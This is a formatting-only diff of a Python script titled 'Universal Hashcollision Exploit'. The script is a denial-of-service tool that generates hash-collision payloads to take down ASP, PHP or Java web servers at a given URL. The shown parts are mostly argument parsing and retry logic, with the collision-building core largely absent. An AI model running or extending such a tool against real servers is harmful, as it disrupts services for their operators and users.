@@ -54,7 +54,9 @@ class Payloadgenerator:
     _recursivemax = 15
     _recursivecounter = 1
 
-    def __init__(self, verbose, collisionchars=5, collisioncharlength=2, payloadlength=8):
+    def __init__(
+        self, verbose, collisionchars=5, collisioncharlength=2, payloadlength=8
+    ):
         self._verbose = verbose
         self._collisionchars = collisionchars
         self._collisioncharlength = collisioncharlength
@@ -107,7 +109,10 @@ class Payloadgenerator:
             if self._recursivecounter > self._recursivemax:
                 print("Not enought values found. Please start this script again")
                 sys.exit(1)
-            print("%d: Not enough values found. Trying it again..." % self._recursivecounter)
+            print(
+                "%d: Not enough values found. Trying it again..."
+                % self._recursivecounter
+            )
             self._recursivecounter = self._recursivecounter + 1
             hashes = self._computeCollisionChars(function, count, charrange)
         else:
@@ -181,12 +186,29 @@ class Payloadgenerator:
 
 def main():
     parser = argparse.ArgumentParser(
-        description="Take down a remote Host via Hashcollisions", prog="Universal Hashcollision Exploit"
+        description="Take down a remote Host via Hashcollisions",
+        prog="Universal Hashcollision Exploit",
     )
     parser.add_argument("-u", "--url", dest="url", help="Url to attack", required=True)
-    parser.add_argument("-w", "--wait", dest="wait", action="store_true", default=False, help="wait for Response")
-    parser.add_argument("-c", "--count", dest="count", type=int, default=1, help="How many requests")
-    parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", default=False, help="Verbose output")
+    parser.add_argument(
+        "-w",
+        "--wait",
+        dest="wait",
+        action="store_true",
+        default=False,
+        help="wait for Response",
+    )
+    parser.add_argument(
+        "-c", "--count", dest="count", type=int, default=1, help="How many requests"
+    )
+    parser.add_argument(
+        "-v",
+        "--verbose",
+        dest="verbose",
+        action="store_true",
+        default=False,
+        help="Verbose output",
+    )
     parser.add_argument("-s", "--save", dest="save", help="Save payload to file")
     parser.add_argument("-p", "--payload", dest="payload", help="Save payload to file")
     parser.add_argument(
@@ -196,7 +218,12 @@ def main():
         help="Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w",
     )
     parser.add_argument(
-        "-t", "--target", dest="target", help="Target of the attack", choices=["ASP", "PHP", "JAVA"], required=True
+        "-t",
+        "--target",
+        dest="target",
+        help="Target of the attack",
+        choices=["ASP", "PHP", "JAVA"],
+        required=True,
     )
     parser.add_argument(
         "-m",
@@ -206,7 +233,12 @@ def main():
         type=int,
     )
     parser.add_argument(
-        "-g", "--generate", dest="generate", help="Only generate Payload and exit", default=False, action="store_true"
+        "-g",
+        "--generate",
+        dest="generate",
+        help="Only generate Payload and exit",
+        default=False,
+        action="store_true",
     )
     parser.add_argument("--version", action="version", version="%(prog)s 6.0")
 
@@ -260,7 +292,9 @@ def main():
         collisioncharlength = 2
         # Length of each parameter in the payload
         payloadlength = 8
-        generator = Payloadgenerator(options.verbose, collisionchars, collisioncharlength, payloadlength)
+        generator = Payloadgenerator(
+            options.verbose, collisionchars, collisioncharlength, payloadlength
+        )
         if options.target == "PHP":
             payload = generator.generatePHPPayload()
         elif options.target == "ASP":
